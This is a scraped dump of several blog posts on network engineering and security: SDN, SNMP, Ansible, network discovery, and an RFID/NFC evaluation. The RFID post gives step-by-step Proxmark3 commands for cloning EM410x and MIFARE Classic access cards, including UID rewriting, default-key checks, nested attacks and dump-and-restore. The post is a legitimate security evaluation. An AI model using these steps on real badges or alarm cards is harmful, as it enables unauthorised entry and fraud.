designing a stretched Data Center spanning two or more sites and adding one more site as disaster recovery could be very complex and requires understanding both: the big picture and each detail. Be sure, you\u0026rsquo;re not compiling the bill of material without fully understanding where you want to go in the next few years. Moreover be aware that you should start to design applications in the right way, standardizing and automating everything that can be automated. Automation is the key to being competitive. So be sure you\u0026rsquo;re approaching the right way.\n","cover":"/blog/2018/09/11/what-about-too-complex-it-infrastructures/legacy-infrastructure.webp","permalink":"https://www.adainese.it/blog/2018/09/11/what-about-too-complex-it-infrastructures/","title":"What about too complex IT-Infrastructures?"},{"categories":["infrastructure"],"contents":"We all know that Google, Fastly, and Facebook\u0026hellip; are defining networks as a software (yes, SDN, but the real Software Defined Network) using custom tools. But what exactly does SDN mean?\nSDN is an \u0026ldquo;idea\u0026rdquo;, a good one, but it has been converted into a buzzword to push useless solutions from vendors to customers. So let\u0026rsquo;s forget what we know regarding SDN for a while. And let\u0026rsquo;s start from the beginning.\nSDN, Software Defined Network, means that network is defined by software, not humans. The word \u0026ldquo;defined\u0026rdquo; means \u0026ldquo;built\u0026rdquo;, \u0026ldquo;operated\u0026rdquo;, \u0026ldquo;monitored\u0026rdquo;, \u0026hellip;\nIn other words, you can have VMware NSX or Cisco ACI installed, but if you\u0026rsquo;re operating manually via browser, you don\u0026rsquo;t have an SDN solution in place. Otherwise, if you have a lot of physical routers, but you\u0026rsquo;re managing them with a custom set of automatic scripts, then you\u0026rsquo;re a bit closer to an SDN solution.\nSoftware \u0026ldquo;built\u0026rdquo; Network The word \u0026ldquo;built\u0026rdquo; refers to how your network came up. Are you configuring devices manually one by one? Are you adding virtual networks one by one? Then no, your network is not an SDN solution.\nAn SDN solution should automatically build the required environment with almost no human interaction. Examples:\nA new device must be installed: the serial number is added to a CMDB and a role is defined. Then a set of automatic scripts prepare and configure the device. Meraki and the new SD-WAN solutions are going in this way. A new customer needs a new environment (VRF, routing, firewalls, \u0026hellip;): once the customer is added to a DB, a set of scripts builds all virtual appliances with the right configurations. VMware NSX and Cisco ACI can be used to achieve that, but they are not out-of-the-box solutions. Software \u0026ldquo;operated\u0026rdquo; Network The word \u0026ldquo;operated\u0026rdquo; refers to how you make and track changes on the network. Examples:\nDo you allow your network users to ask for tailored solutions (i.e. a custom network that bridges devices placed in two different DMZ). How do you change NTP servers on all your network devices? How do you find a MAC address within your network? How do you track changes on your network and how do you roll back? Even if your network is probably unique, you should maintain a standard within. You probably don\u0026rsquo;t want to allow any fancy customization requested by users.\nSoftware \u0026ldquo;monitored\u0026rdquo; Network That\u0026rsquo;s the easiest part: how is your network monitored? Many commercial and open-source software exist, so probably your network is already monitored by software, but:\nHow do you add a new device to your monitor? How do you add a new network port to your monitor? How do you troubleshoot an issue on your network? If you\u0026rsquo;re manually adding each interface to your monitor infrastructure, maybe there is something you can improve.\nTroubleshooting a network usually need human intervention, and often the CLI is still required to understand what is going on in the deep. But with a real SDN solution operators should identify the broken device by checking the monitor, not connecting to devices, one by one, and looking for anomalies.\nSDN: how to start? As I mentioned before, there are some solutions that can solve a specific case or can act as enablers. Meraki, Viptela, Nuage\u0026hellip; can easily help to deploy hundreds of interconnected sites. VMware NSX, Cisco ACI, and Juniper Contrail can easily help to build stretched sites. But of course, products are not enough.\nThe first and most important refers to methodology (or business processes). Examples:\nHow the network team operates? Every guy has his custom approach or are people following the same procedures? How do requests come to the network team? Via a ticketing system, or near the coffee machine? What can a user request to the network team? Everything because their boss is more powerful or can the network team deny crazy requests? If every crazy request must be satisfied, don\u0026rsquo;t waste money looking for an SDN solution. Before, review internal procedures and work methodologies.\nThe second step for SDN (and automation in general) is \u0026ldquo;standardization\u0026rdquo;. Standard is not referred to as some fancy ISO document but as an internal standard. Examples:\nACLs should use a naming convention, and if the same ACL is configured on multiple devices, use the same name. If you have dozens or hundreds of branch offices, consider always using the same VLANs for the same purpose. Third step: find the most time-spending tasks, review them, and try to automatize them.\nConclusions In this post, we reviewed what an SDN solution should do, and the first step to converting an existing solution to something closer to SDN.\nEven if some vendors and solutions have been mentioned, legacy devices can still be used to implement an SDN solution. In the next post, we\u0026rsquo;ll see how and why we should handle a network as we\u0026rsquo;re writing software.\nIn the next post, we\u0026rsquo;ll see an SDN approach for legacy networks.\n","cover":"/blog/2018/09/06/is-sdn-just-a-buzzword-part-1/aci-architecture.webp","permalink":"https://www.adainese.it/blog/2018/09/06/is-sdn-just-a-buzzword-part-1/","title":"Is SDN just a buzzword? (part 1)"},{"categories":["security"],"contents":"Many companies rely on RFID (Radio-frequency identification) tags for many aspects. Employer badges are often RFID-based and allow for unique identification, authorization, and account for each employer.\nOther companies use simple RFID tags or the more evolved NFC smartcards to identify and bill for services. Many home alarm systems use RFID tags to manage arm/disarm operations. Moreover, RFID tags are used to identify goods within stores or buildings in general. In a utopian world, everything would be fine, but in the real world, we should ask how we can trust users, and technology and we must evaluate the risks caused by a tampered NFC smartcard or RFID in general.\nWhat about if an employer badge is duplicated? What about if a home alarm NFC smartcard is duplicated? What about if a laundry machine smartcard has been tampered? What about if an RFID tag is substituted/deactivated?\nThis won\u0026rsquo;t be an exhaustive post about RFID technology, we\u0026rsquo;ll focus on how they are used in the real world. The most common RFID devices we found, are:\n125kHz RFID tags (EM410x) 13.56MHZ NFC smartcards (MIFARE Classic) Both of them are old and very insecure for many reasons.\nThe Red Team perspective The cheapest and most flexible tool we found is ProxMark3 (PM3) Easy, it can be found on eBay at about 60€. It\u0026rsquo;s a USB device with two antennas, for 125kHz and 15.56MHz tags. The bundle includes some blank tags.\nWe\u0026rsquo;re using the PM3 attached to a VM running the latest Kali Linux on VMware Fusion. The PM3 can be mapped to the VM and it works fine.\nUpgrading the PM3 Before using the PM3, it must be upgraded. Connect it to a Linux OS, and check if it\u0026rsquo;s detected using dmesg and/or lsusb. If it\u0026rsquo;s not detected, unplug it, press and hold the button on the PM3, and plug it again (keep the PM3 button pressed).\n# dmesg [...] [ 3056.340405] usb 1-2.2: new full-speed USB device number 5 using uhci_hcd [ 3056.455030] usb 1-2.2: New USB device found, idVendor=9ac4, idProduct=4b8f [ 3056.455033] usb 1-2.2: New USB device strings: Mfr=1, Product=2, SerialNumber=0 [ 3056.455034] usb 1-2.2: Product: PM3 [ 3056.455035] usb 1-2.2: Manufacturer: proxmark.org [ 3056.623029] cdc_acm 1-2.2:1.0: ttyACM0: USB ACM device [ 3056.625835] usbcore: registered new interface driver cdc_acm [ 3056.625836] cdc_acm: USB Abstract Control Model driver for USB modems and ISDN adapters [ 3171.708851] usb 1-2.2: USB disconnect, device number 5 Please read the full HowTo before continuing. Now download and prepare the environment to upgrade the PM3:\nsudo apt-get -y install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config cd /usr/src/ sudo git clone https://github.com/Proxmark/proxmark3 cd proxmark3 cd armsrc make cd .. cd client sudo make And now (from the client directory) upgrade the boot loader (if required) and the firmware:\nsudo ./flasher /dev/ttyACM0 -b ../bootrom/obj/bootrom.elf sudo ./flasher /dev/ttyACM0 ../armsrc/obj/fullimage.elf Remember you need to keep the PM3 button pressed, as explained before.\nInside the client directory run the PM3 client:\n# ./proxmark3 /dev/ttyACM0 proxmark3\u0026gt; hw status #db# Memory #db# BIGBUF_SIZE.............40000 #db# Available memory........40000 #db# Tracing #db# tracing ................1 #db# traceLen ...............0 #db# Fgpa #db# mode....................HF #db# LF Sampling config: #db# [q] divisor: 95 #db# [b] bps: 8 #db# [d] decimation: 1 #db# [a] averaging: 1 #db# [t] trigger threshold: 0 #db# USB Speed: #db# Sending USB packets to client... #db# Time elapsed: 1500ms #db# Bytes transferred: 875008 #db# USB Transfer Speed PM3 -\u0026gt; Client = 583338 Bytes/s #db# Various #db# MF_DBGLEVEL......2 #db# ToSendMax........-722433155 #db# ToSendBit........0 proxmark3\u0026gt; hw version [[[ Cached information ]]] Prox/RFID mark3 RFID instrument bootrom: master/v3.0.1-181-gaa264ab-suspect 2017-11-14 18:49:33 os: master/v3.0.1-233-g91e0384-suspect 2017-12-27 20:48:13 LF FPGA image built for 2s30vq100 on 2015/03/06 at 07:38:04 HF FPGA image built for 2s30vq100 on 2017/10/27 at 08:30:59 uC: AT91SAM7S256 Rev D Embedded Processor: ARM7TDMI Nonvolatile Program Memory Size: 256K bytes. Used: 197722 bytes (75%). Free: 64422 bytes (25%). Second Nonvolatile Program Memory Size: None Internal SRAM Size: 64K bytes Architecture Identifier: AT91SAM7Sxx Series Nonvolatile Program Memory Type: Embedded Flash Memory proxmark3\u0026gt; hw tune Measuring antenna characteristics, please wait... # LF antenna: 25.57 V @ 125.00 kHz # LF antenna: 19.80 V @ 134.00 kHz # LF optimal: 25.57 V @ 123.71 kHz # HF antenna: 24.03 V @ 13.56 MHz Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz. Analyzing RFID tags with ProxMark3 Easy PM3 is now ready to read tags. To scan an unknown tag we need to type two commands, one for each antenna:\nproxmark3\u0026gt; hf search proxmark3\u0026gt; lf search If the scanned tag is supported, one of the above commands should answer with the details of the tag.\nAnalyzing an EM410x tag The following is an access card for a restricted area:\nproxmark3\u0026gt; lf search NOTE: some demods output possible binary if it finds something that looks like a tag False Positives ARE possible Checking for known tags: EM410x pattern found: EM TAG ID : 1111111111 Possible de-scramble patterns Unique TAG ID : 2222222222 HoneyWell IdentKey { DEZ 8 : 01118481 DEZ 10 : 0286331153 DEZ 5.5 : 04369.04369 DEZ 3.5A : 017.04369 DEZ 3.5B : 017.04369 DEZ 3.5C : 017.04369 DEZ 14/IK2 : 00073300775185 DEZ 15/IK3 : 000586406201480 DEZ 20/ZK : 08080808080808080808 } Other : 04369_017_01118481 Pattern Paxton : 287657745 [0x11254F11] Pattern 1 : 4342282 [0x42420A] Pattern Sebury : 4369 17 1118481 [0x1111 0x11 0x111111] Valid EM410x ID Found! We guess that the authentications is based on EM TAG ID only, so we need to copy that on a new tag:\nproxmark3\u0026gt; lf em 410xwrite 1111111111 1 Writing T55x7 tag with UID 0x1111111111 (clock rate: 64) #db# Started writing T55x7 tag ... #db# Clock rate: 64 #db# Tag T55x7 written with 0xffc700025fddc8be And it worked.\nWe discovered that many companies still rely on weak technology for access control.\nAnalyzing a MiFare Classic NFC smartcard The following is an access card for a restricted area:\nproxmark3\u0026gt; hf search UID : 11 11 11 11 ATQA : 00 04 SAK : 08 [2] TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 proprietary non iso14443-4 card found, RATS not supported No chinese magic backdoor command detected Prng detection: WEAK Valid ISO14443A Tag Found - Quiting Search MiFare Classic smartcards are not secure:\nWe can recover the full 48-bit key of the MiFare algorithm in 200 seconds on a PC, given 1 known IV (from one single encryption). The security of this cipher is therefore close to zero.\nCourtois, Nicolas T.; Karsten Nohl; Sean O\u0026rsquo;Neil (2008-04-14). \u0026ldquo;Algebraic Attacks on the Crypto-1 Stream Cipher in MiFare Classic and Oyster Cards\u0026rdquo;. Cryptology ePrint Archive.\nBy the way, in many cases, we don\u0026rsquo;t even need to crack a card because:\nUID is enough data are not encrypted or encrypted with a default key Let\u0026rsquo;s start with the easier and common scenario, and let\u0026rsquo;s clone the UID only to another smartcard:\nproxmark3\u0026gt; hf mf csetuid 11111111 uid:8e 71 ae 0f #db# halt error. response len: 1 Chinese magic backdoor commands (GEN 1a) detected #db# halt error. response len: 1 #db# Halt error old block 0: c0 92 ee 01 bd 08 04 00 62 63 64 65 66 67 68 69 new block 0: 11 11 11 11 5e 08 04 00 62 63 64 65 66 67 68 69 #db# halt error. response len: 1 old UID:c0 92 ee 01 new UID:11 11 11 11 And it works with many access cards based on MiFare Classic.\nOther implementations, like public laundry machines or public transport, save additional data, that can be possibly encrypted:\nproxmark3\u0026gt; hf mf chk - ? No key specified, trying default keys chk default key[ 0] ffffffffffff chk default key[ 1] 000000000000 chk default key[ 2] a0a1a2a3a4a5 chk default key[ 3] b0b1b2b3b4b5 chk default key[ 4] aabbccddeeff chk default key[ 5] 1a2b3c4d5e6f chk default key[ 6] 123456789abc chk default key[ 7] 010203040506 chk default key[ 8] 123456abcdef chk default key[ 9] abcdef123456 chk default key[10] 4d3a99c351dd chk default key[11] 1a982c7e459a chk default key[12] d3f7d3f7d3f7 chk default key[13] 714c5c886e97 chk default key[14] 587ee5f9350f chk default key[15] a0478cc39091 chk default key[16] 533cb6c723f6 chk default key[17] 8fd0a4f256e9 To cancel this operation press the button on the proxmark... --o |---|----------------|---|----------------|---| |sec|key A |res|key B |res| |---|----------------|---|----------------|---| |000| ffffffffffff | 1 | ffffffffffff | 1 | |001| ffffffffffff | 1 | ffffffffffff | 1 | |002| ffffffffffff | 1 | ffffffffffff | 1 | |003| ffffffffffff | 1 | ffffffffffff | 1 | |004| ffffffffffff | 1 | ffffffffffff | 1 | |005| ffffffffffff | 1 | ffffffffffff | 1 | |006| ffffffffffff | 1 | ffffffffffff | 1 | |007| ffffffffffff | 1 | ffffffffffff | 1 | |008| ffffffffffff | 1 | ffffffffffff | 1 | |009| ffffffffffff | 1 | ffffffffffff | 1 | |010| ffffffffffff | 1 | ffffffffffff | 1 | |011| ffffffffffff | 1 | ffffffffffff | 1 | |012| ffffffffffff | 1 | ffffffffffff | 1 | |013| ffffffffffff | 1 | ffffffffffff | 1 | |014| ffffffffffff | 1 | ffffffffffff | 1 | |015| ffffffffffff | 1 | ffffffffffff | 1 | |---|----------------|---|----------------|---| The above card is using the default key: ffffffffffff. If data are partially encrypted with a non-default key, we can try a nested attack, using one of the default keys:\nproxmark3\u0026gt; hf mf nested 1 0 A ffffffffffff d Or we can test other attacks:\nproxmark3\u0026gt; hf mf mifare Once we have all keys (dumped into dumpkeys.bin file), we can dump the card into the dumpdata.bin file:\nproxmark3\u0026gt; hf mf dump 1 And we can copy the content to a new card:\nproxmark3\u0026gt; hf mf restore 1 And it worked.\nWe discovered that even if additional (but weak) security layers are available, they are rarely used.\nThe Blue Team perspective Each component included, installed, and used in any enterprise (or any house) should be evaluated especially if it can lead to a security breach. Referring to a company, if the evaluation cannot be provided by an internal team, use one (or more) trusted external service. Don\u0026rsquo;t trust vendors without testing them. Don\u0026rsquo;t buy or implement solutions without knowing them in the detail.\nSecure smartcard solutions currently exist, but the question is: for how long they will remain secure? The question is very important, because if a big worldwide enterprise decides to implement an access solution based on the latest and most secure smartcard for 30000 employers, what it should do if (better say when) that smartcard will no more secure? How much does cost the migration to another access control system? Should it use something upgradeable (like an app on a smartphone), or should it maintain a weak access control?\nIt depends, as always\u0026hellip; on risk and cost analysis.\nConclusions We discovered a large number of weak implementations, provided also by respectable vendors but implemented poorly. Day after day we realized that no vendor can be blinded trusted, no matter how respectable it is. If enterprises can usually afford the cost of a third opinion, end users rarely can. The more IoT, smart homes we see, the more I tend to get a simple \u0026ldquo;smart less\u0026rdquo; building. This is still not the era of the \u0026ldquo;apartment thieves\u0026rdquo;, but it will come soon.\nReferences Proxmark3 Wiki Proxmark3 on Kali Linux Cloning RFID Tags with Proxmark 3 RFID Hacking with The Proxmark 3 Reverse Engineering HID iClass Master Keys Algebraic Attacks on the Crypto-1 Stream Cipher in MiFare Classic and Oyster Cards Security Risks of Near Field Communication ","cover":"/blog/2018/01/12/evaluating-security-of-rfid/nfc-implementations/proxmark.webp","permalink":"https://www.adainese.it/blog/2018/01/12/evaluating-security-of-rfid/nfc-implementations/","title":"Evaluating security of RFID/NFC implementations"},{"categories":["ciso"],"contents":"We\u0026rsquo;re leaving in the \u0026lsquo;hype\u0026rsquo; era, where everything is sold as the Holy Grail for a non-real problem. Let\u0026rsquo;s try to analyze things with a critical eye.\nPushed by a friend, who is writing a couple of very good posts I recommend, I\u0026rsquo;m now sharing my thoughts about automation, the future of network engineers, AI, and so on. Of course, this is the point of view of my mind, as a result of 20 years playing in the IT world at both work and home.\nIt seems to me that vendors are trying to push more and more cool words, at a higher rate compared to the past. A few years ago the \u0026ldquo;IT outsourcing\u0026rdquo; mantra lasted for a while, and everyone had to \u0026ldquo;outsource\u0026rdquo; something to become a good manager. After a while, it was the \u0026ldquo;cloud\u0026rdquo; era, but it was too early, so it was a false start. In the last two years, we have seen many \u0026ldquo;mantras\u0026rdquo; coming together: big data, cloud (again, but with a different awareness), Cyber security, automation, big data, and machine learning. They are too many mantras! Not so many years ago, the idea of the cloud could be compared to a startup, and that startup was selling something not ready for the enterprise market. In the last few years, thanks to Amazon, Google, Microsoft, Salesforce, and so on, enterprises and IT managers can now approach a valid cloud strategy with more awareness.\nLesson learned: better if we wait for the second generation to have a mature technology.\nI would add another one:\nLesson learned: successful startup aims to be bought by big companies. Buying cloud services from small companies can lead to unexpected services/license changes.\nNow let\u0026rsquo;s apply the above thesis to the current mantras, especially to: automation, machine learning, and Cyber security.\nI guess I can affirm that networking vendors are including automation on every product. So we have REST APIs to program every device and UI (user interfaces) that should help to manage the whole infrastructure with few clicks and without the knowledge of what is below. But again the real world is different than what is told by marketing: a lot of bugs that make software unusable or dangerous.\nMoreover asking for support from vendors gives fewer results than a walk to Santiago de Compostela or Lourdes.\nAdecco India at Cisco It seems to me that vendors are not interested in selling good software, everything should be developed and sold \u0026ldquo;agile\u0026rdquo; (no matter if the agile methodology is a completely different thing). And the most critical aspect is that the quality of support teams is terrible: a lot of FTE is spent for debugging what should be analyzed by the vendor, a lot of \u0026ldquo;it\u0026rsquo;s by design\u0026rdquo; embarrassing limits, and really, too many untrained people unable to support anything or anyone.\nLesson learned: vendors cannot write good software, and apparently, they don\u0026rsquo;t care too much about that. They are only interested in selling ideas, not real and working features.\nLet\u0026rsquo;s move now on to machine learning, the \u0026ldquo;hype\u0026rdquo; that will make humans useless. Computers can learn and detect things better than humans and will be able to analyze a lot of data in a relatively short time. So big data is not a problem anymore. But\u0026hellip; because there is always a \u0026ldquo;but\u0026rdquo;, the real world is a little bit different. If someone is using Facebook to guess sexual orientation, we should ask ourselves how much that research is \u0026ldquo;marketing\u0026rdquo; and how much is \u0026ldquo;real\u0026rdquo;. And the answer is that machine learning, used to detect if a photographed man is gay, is slightly more efficient than an untrained human. So current machine learning algorithms perform better than thousands of untrained people. And that\u0026rsquo;s still a good thing, but we should remember that machine learning algorithms don\u0026rsquo;t (currently) perform like experts.\nLesson learned: (current) machine learning algorithms slightly perform better than untrained humans, but they can manage a lot of data and much faster than humans.\nBut machine learning applied to automation and Cyber security will save the world! (maybe)\nThe security of our infrastructures/software/iot/whatever electronic device is embarrassing. We have a lot of non-upgradeable devices (mobile phones, IoT devices, set-top boxes\u0026hellip;) and we have also a lot of vulnerable design devices. Moreover, we have infrastructures managed by untrained (cheap) people, all around the world. We have critical services exposed to the Internet with default or blank passwords. But we have a lot of vendors selling the Holy Grail of security.\nHoly Grail is not enough I guess, because we still have thousands of computers infected by WannaCry ransomware and sooner or later someone will pay the price.\nLesson learned: Cyber security is the current mantra, but it won\u0026rsquo;t help too much.\nSo we have mature cloud services, but automation, machine learning, and security are still too young. The last year demonstrated that connecting everything to the Internet is not always a good idea, especially if we\u0026rsquo;re connecting hospitals, 911 emergency numbers, peacemakers, airplanes, or IoT devices.\nShould we live as Amish people does? Indeed that\u0026rsquo;s a possibility, and when I retire, I\u0026rsquo;ll think about that for sure.\nHow will be the future? To conclude my mind-flow:\nWill the cloud kill IT, experts? No, because infrastructures must be managed, platforms must be well-deployed, and services must be well-designed and well-implemented. Will automation kill network experts? No, because network experts started to automate things 10 years ago, and the current \u0026ldquo;hype\u0026rdquo; is not changing things so much. You have to know what is below if you want to implement a good and effective solution. Is Cybersecurity only a new \u0026ldquo;hype\u0026rdquo;? The network has been always asked to fix poorly designed software. I could write a lot about how \u0026ldquo;stretched data-center\u0026rdquo; is a bad choice, but that\u0026rsquo;s not the right post. I can see more good tools used to fix the wrong thing (containers used as a VM, snapshot used as a backup\u0026hellip;). But the network layer cannot fix every single mistake of the above layers, and sooner or later the above layers will pay a price.\nI think that Darwin\u0026rsquo;s Law of Evolution by Natural Selection is valid also for computers and electronic devices. But it could dramatically impact human life too.\nReferences Let\u0026rsquo;s Drop Some Random Commands, Shall We? New AI can guess whether you\u0026rsquo;re gay or straight from a photograph You\u0026rsquo;re Looking Gay, Today 115 batshit stupid things you can put on the internet in as fast as I can go by Dan Tentler UK hospitals hit with massive ransomware attack The Coming Software Apocalypse FDA Recalls Nearly Half a Million Pacemakers Over Hacking Fears Germanwings Crash Prompts Debate About Remote-Controlled Planes 650Gbps DDoS Attack from the Leet Botnet Microsoft and Mozilla ban Dutch government root certificate Blackout ","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2017/10/09/the-darwins-law-of-evolution-for-computers/","title":"The Darwin's Law of Evolution for computers"},{"categories":["security","personal-security","notes"],"contents":"Every time I need to work with Linux SNMP utilities, I have to re-learn some commands. This post summarizes useful SNMP commands for anyone who needs a reference guide.\nCommon options Usually, I need to build a custom and trusted MIB repository. Every SNMP utility can take the following flags:\n-M takes one or more directories where look for an MIB file. -m selectively load MIB files from the above directories. I usually use ALL. SNMP Translate Dealing with MIB files can be a pain. Sometimes is faster and simpler to use the numeric OIDs. But how we can find numeric OID from alphabetic ones and back?\nFind matching MIB files given a regex:\n$ snmptranslate -m ALL -M mibs -TB sysName SNMPv2-MIB::sysName Print the numeric OID gave an alphabetic ones:\n$ snmptranslate -m ALL -M $HOME/.snmp/mibs -On SNMPv2-MIB::sysName .1.3.6.1.2.1.1.5 Print the alphabetic OID given a numeric one:\n$ snmptranslate -m ALL -M $HOME/.snmp/mibs .1.3.6.1.2.1.1.5 SNMPv2-MIB::sysName Print only the last symbolic element of an OID (numeric or alphabetic):\n$ snmptranslate -m ALL -M $HOME/.snmp/mibs -Os .1.3.6.1.2.1.1.5 sysName Print full alphabetic OID, given a numeric ones:\n$ snmptranslate -m ALL -M $HOME/.snmp/mibs -Of .1.3.6.1.2.1.1.5 .iso.org.dod.internet.mgmt.mib-2.system.sysName SNMP Get and Walk Getting a single SNMP entry:\n$ snmpget -m ALL -M $HOME/.snmp/mibs -v3 -l authNoPriv -u username -a SHA -A password 10.1.1.6 sysName SNMPv2-MIB::sysName = No Such Instance currently exists at this OID The snmpget command does not \u0026ldquo;walk\u0026rdquo;, so the exact OID must be given:\n$ snmpget -m ALL -M $HOME/.snmp/mibs -v3 -l authNoPriv -u username -a SHA -A password 10.1.1.6 sysName.0 SNMPv2-MIB::sysName.0 = STRING: router.example.com Because of that, usually snmpwalk is preferred:\n$ snmpwalk -m ALL -M $HOME/.snmp/mibs -v3 -l authNoPriv -u username -a SHA -A password 10.1.1.6 sysName SNMPv2-MIB::sysName.0 = STRING: router.example.com Get a table via SNMP Some SNMP entry can be retrieved individually or aggregated (in a table): those attributes usually contains Table inside the alphabetic OID. Let\u0026rsquo;s retrieve, for example, ifTable:\n$ snmptable -m ALL -M $HOME/.snmp/mibs -v3 -l authNoPriv -u username -a SHA -A password -Cf , 10.1.1.6 ifTable SNMP table: IF-MIB::ifTable ifIndex,ifDescr,ifType,ifMtu,ifSpeed,ifPhysAddress,ifAdminStatus,ifOperStatus,ifLastChange,ifInOctets,ifInUcastPkts,ifInNUcastPkts,ifInDiscards,ifInErrors,ifInUnknownProtos,ifOutOctets,ifOutUcastPkts,ifOutNUcastPkts,ifOutDiscards,ifOutErrors,ifOutQLen,ifSpecific 1,Ethernet0/0,ethernetCsmacd,1500,10000000,0:2:16:cd:7:a0,up,up,0:13:59:40.11,1933415192,81395,19172271,114,102,7142667,129749909,1081118,186805,0,48,0,ccitt.0 2,Null0,other,1500,4294967295,,up,up,0:0:00:00.00,0,0,0,0,0,0,0,0,0,0,0,0,ccitt.0 The above example will delimitate columns using a ,, useful to generate a CSV compatible output.\nA large screen readable output can be the following:\n$ snmptable -m ALL -M $HOME/.snmp/mibs -v3 -l authNoPriv -u username -a SHA -A password -Cc 10 10.1.1.6 ifTable SNMP table: IF-MIB::ifTable ifIndex ifDescr ifType ifMtu ifSpeed ifPhysAdd ifAdminSt ifOperSta ifLastCha ifInOctet ifInUcast ifInNUcas ifInDisca ifInError ifInUnkno ifOutOcte ifOutUcas ifOutNUca ifOutDisc ifOutErro ifOutQLen ifSpecifi 1 Ethernet0 ethernetC 1500 10000000 0:2:16:cd up up 0:13:59:4 193354931 81408 19173500 114 102 7143018 129757359 1081161 186811 0 48 0 ccitt.0 2 Null0 other 1500 429496729 up up 0:0:00:00 0 0 0 0 0 0 0 0 0 0 0 0 ccitt.0 References SNMP Object Navigator Private Enterprise Numbers Private Enterprise Number (PEN) Request ","cover":"/images/vendors/bash.webp","permalink":"https://www.adainese.it/blog/2017/03/29/working-with-snmp-on-linux/","title":"Working with SNMP on Linux"},{"categories":["automation"],"contents":"NetBrain is a famous software that allows network discovery (and management). Let\u0026rsquo;s focus now on network discovery and documentation: we want to automatically discover network devices, and how they\u0026rsquo;re connected, and store everything into a version control repository (GIT/CVS).\nSo we want to:\ndiscover all network devices; map how they\u0026rsquo;re connected; track changes automatically; store everything into a version control repository (GIT/CVS); visualize any updated map with a simple browser. How we can solve the above problem:\nwe assume all devices by Cisco, so we can use CDP; we can get CDP data via SNMPv3; we can build a (source, destination) topology; we can store the topology into a revision control repository (GIT/CVS); we can use jsPlumb to render the (source, destination) topology into a web page. netdoc netdoc is the small experiment I wrote to solve the problem. It contains two Python scripts:\nnetdiscover.py: to discover network devices via SNMPv3 and generates two .ini files: discovered_nodes.ini: contains all network devices with some additional information discovered_connections.ini: contains all network connections with some additional information netplot.py: to plot a web page from the above .ini files. .ini files can be stored in a revision control repository. Running netconf\nCurrently, netdoc is a POC script, so maybe it can work on your infrastructure, maybe it won\u0026rsquo;t. To start it, run:\n./netdiscover.py -u snmpv3user -p snmpv3password -h 10.1.1.4 -h 10.1.1.5 -h 10.1.1.6 The discovered_nodes.ini file contains all CDP discovered devices in the following form:\n[AccessServer] id = AccessServer image = router.svg disabled = false platform = cisco 2610 The title is the CDP neighbor ID (usually the hostname); other attributes are:\nid: the CDP neighbor ID (usually the hostname) image: an image used to display the node in the web page disabled: true if missing during the last scan platform: the CDP neighbor platform The discovered_connections.ini file contains all CDP discovered connections in the following form:\n[AccessServer:e0/0-switch.example.com:gi2/0/46] source = AccessServer source_if = e0/0 destination = swipd002.campus.infocert.it destination_if = gi2/0/46 disabled = false The title is the source and destination CDP neighbor ID with interface names; other attributes are:\nsource: the source CDP neighbor ID source_if: the source interface name destination: the destination CDP neighbor ID destination_id: the destination interface name disabled: true if missing during the last scan After a successful scan we can create the HTML page:\n./netplot.py \u0026gt; netdoc.html And here we go, a draggable web page:\n","cover":"/blog/2017/03/28/automatic-network-discovery-and-documentation/topology.webp","permalink":"https://www.adainese.it/blog/2017/03/28/automatic-network-discovery-and-documentation/","title":"Automatic network discovery and documentation"},{"categories":["automation"],"contents":"After installing Ansible (see previous post), it\u0026rsquo;s now time to manage how to send multiple commands (and check) to Cisco IOS devices. This post will explain a playbook (recipe) for clock and NTP configuration.\nSee the complete script on my Ansible repository .\nPlanning an Ansible playbook When we plan what we want, things are more easy. The idea for our NTP playbook is:\nread configuration from an external file; get router/Switch configuration; update timezone if different; configure summertime or update it if different; configure ntp source interface or update it if different; add ntp servers and remove wrong ones; save configuration only if necessary. Configuration file is:\n# cat etc/ntp_config.yaml timezone: \u0026#34;clock timezone CET 1 0\u0026#34; summertime: \u0026#34;clock summer-time CEST recurring last Sun Mar 2:00 last Sun Oct 3:00\u0026#34; ntp_source: \u0026#34;ntp source Ethernet0/0\u0026#34; ntp_servers: - \u0026#34;ntp server 1.1.1.1\u0026#34; - \u0026#34;ntp server 1.1.1.2\u0026#34; - \u0026#34;ntp server 1.1.1.3\u0026#34; - \u0026#34;ntp server 1.1.1.4\u0026#34; Getting router/switch configuration Ansible provides the ios_command useful to send a single command and grab the output. The following task will grab clock and ntp configuration:\n- name: \u0026#34;GET NTP CONFIGURATION\u0026#34; register: get_ntp_config ios_command: provider: \u0026#34;{{ provider }}\u0026#34; commands: - \u0026#34;show running-config | include clock timezone\u0026#34; - \u0026#34;show running-config | include clock summer-time\u0026#34; - \u0026#34;show running-config | include ntp source\u0026#34; - \u0026#34;show running-config | include ntp server\u0026#34; Output will be saved on get_ntp_config array. Each command will have a different key, starting from 0. Each value is an array because each command can grab multiple lines. So get_ntp_config is an array of arrays.\nSetting timezone Ansible provides the ios_config useful to send a multiple command in configuration mode. The following task will configure timezone if needed:\n- name: \u0026#34;SET TIMEZONE\u0026#34; when: \u0026#34;(timezone is defined) and (timezone != get_ntp_config.stdout_lines[0][0])\u0026#34; register: set_timezone ios_config: provider: \u0026#34;{{ provider }}\u0026#34; lines: - \u0026#34;{{ timezone }}\u0026#34; - name: \u0026#34;POSTPONE CONFIGURATION SAVE\u0026#34; when: \u0026#34;(set_timezone.changed == true)\u0026#34; set_fact: configured=true The above tasks will:\nupdate timezone, only if needed; track the result in set_timezone variable; track the changes in a single variable (configured). Setting and removing summertime Summertime must be:\nconfigured, if missing; updated, if different from desiderata; removed, if not present in configuration file. - name: \u0026#34;SET SUMMERTIME\u0026#34; when: \u0026#34;(summertime is defined) and (summertime != get_ntp_config.stdout_lines[1][0])\u0026#34; register: set_summertime ios_config: provider: \u0026#34;{{ provider }}\u0026#34; lines: - \u0026#34;{{ summertime }}\u0026#34; - name: \u0026#34;POSTPONE CONFIGURATION SAVE\u0026#34; when: \u0026#34;(set_timezone.changed == true)\u0026#34; set_fact: configured=true - name: \u0026#34;REMOVE SUMMERTIME\u0026#34; when: \u0026#34;(summertime is not defined) and (get_ntp_config.stdout_lines[1][0] != \\\u0026#34;\\\u0026#34;)\u0026#34; register: remove_summertime ios_config: provider: \u0026#34;{{ provider }}\u0026#34; lines: - \u0026#34;no {{ get_ntp_config.stdout_lines[1][0] }}\u0026#34; - name: \u0026#34;POSTPONE CONFIGURATION 